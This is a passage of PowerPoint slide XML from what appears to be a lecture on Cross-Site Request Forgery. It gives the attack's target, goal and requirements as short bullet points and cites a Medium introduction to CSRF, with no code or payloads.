          <a:noFill/>
          <a:ln w="19645">
            <a:solidFill>
              <a:srgbClr val="000000"/>
            </a:solidFill>
            <a:prstDash val="dash"/>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF"/>
                </a:solidFill>
              </a14:hiddenFill>
            </a:ext>
          </a:extLst>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0"/>
          <a:lstStyle/>
          <a:p>
            <a:pPr eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="40" name="object 39"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9592236" y="3332350"/>
            <a:ext cx="514070" cy="353045"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2294" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>$$$</a:t>
            </a:r>
            <a:endParaRPr sz="2294">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="TextBox 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BBAE3BF9-8004-1A33-5E9D-161742BC4256}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5349240" y="6366510"/>
            <a:ext cx="6686550" cy="369332"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" dirty="0"/>
              <a:t>https://medium.com/@charithra/introduction-to-csrf-a329badfca49</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="413076153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39228" y="717177"/>
            <a:ext cx="7513544" cy="770578"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" wrap="square" lIns="0" tIns="50338" rIns="0" bIns="0" numCol="1" rtlCol="0" anchor="t" anchorCtr="0" compatLnSpc="1">
            <a:prstTxWarp prst="textNoShape">
              <a:avLst/>
            </a:prstTxWarp>
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="36358" eaLnBrk="1" fontAlgn="auto" hangingPunct="1">
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPts val="0"/>
              </a:spcAft>
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="4677" spc="-22" dirty="0"/>
              <a:t>Cross-Site </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4677" spc="13" dirty="0"/>
              <a:t>Request</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4677" spc="-9" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="4677" spc="22" dirty="0"/>
              <a:t>Forgery</a:t>
            </a:r>
            <a:endParaRPr sz="4677" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="object 3"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="2117912"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="object 4"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599765" y="2067486"/>
            <a:ext cx="6874809" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="-35" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Target</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-35" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>User who has an </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="31" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>account </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>on a </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>vulnerable</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="84" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>server</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="object 5"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="2759448"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="object 6"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599765" y="2706221"/>
            <a:ext cx="7224993" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="18" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Attack </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="22" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>goal</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="22" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>: </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Send </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>requests </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>server </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>via </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="-31" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>user’s</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" i="1" spc="9" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>browser</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="object 7"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="3193676"/>
            <a:ext cx="126066" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="object 8"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2902324" y="3143251"/>
            <a:ext cx="5623953" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Look </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>to the </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>server like </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>the </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>user </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="26" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>intended </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>them</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="object 9"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="3835213"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="89098" name="object 10"/>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="2599765" y="3795993"/>
            <a:ext cx="6646489" cy="6668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12700">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="742950" indent="-285750">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="1143000" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1600200" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="2057400" indent="-228600">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl5pPr>
            <a:lvl6pPr marL="2514600" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl6pPr>
            <a:lvl7pPr marL="2971800" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl7pPr>
            <a:lvl8pPr marL="3429000" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl8pPr>
            <a:lvl9pPr marL="3886200" indent="-228600" eaLnBrk="0" fontAlgn="base" hangingPunct="0">
              <a:spcBef>
                <a:spcPct val="20000"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
              <a:defRPr>
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="Calibri" panose="020F0502020204030204" pitchFamily="34" charset="0"/>
              </a:defRPr>
            </a:lvl9pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr fontAlgn="base">
              <a:lnSpc>
                <a:spcPts val="2559"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:spcAft>
                <a:spcPct val="0"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Attacker needs</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2118">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:cs typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>: Ability to get the user to “click a link”  crafted by the attacker that goes to the vulnerable site</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="object 11"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2332225" y="4797519"/>
            <a:ext cx="124665" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="object 12"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2599765" y="4745692"/>
            <a:ext cx="1304085" cy="325923"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="2118" spc="-4" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>Key</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="-49" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="13" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="C82506"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>tricks</a:t>
            </a:r>
            <a:r>
              <a:rPr sz="2118" spc="13" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>:</a:t>
            </a:r>
            <a:endParaRPr sz="2118">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="object 13"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="5231747"/>
            <a:ext cx="126066" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14" name="object 14"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2634784" y="5671577"/>
            <a:ext cx="126066" cy="244362"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr lIns="0" tIns="0" rIns="0" bIns="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr marL="11185">
              <a:defRPr/>
            </a:pPr>
            <a:r>
              <a:rPr sz="1588" spc="251" dirty="0">
                <a:solidFill>
                  <a:prstClr val="black"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
                <a:cs typeface="Arial"/>
              </a:rPr>
              <a:t>•</a:t>
            </a:r>
            <a:endParaRPr sz="1588">
              <a:solidFill>
                <a:prstClr val="black"/>
              </a:solidFill>
              <a:latin typeface="Arial"/>
              <a:cs typeface="Arial"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
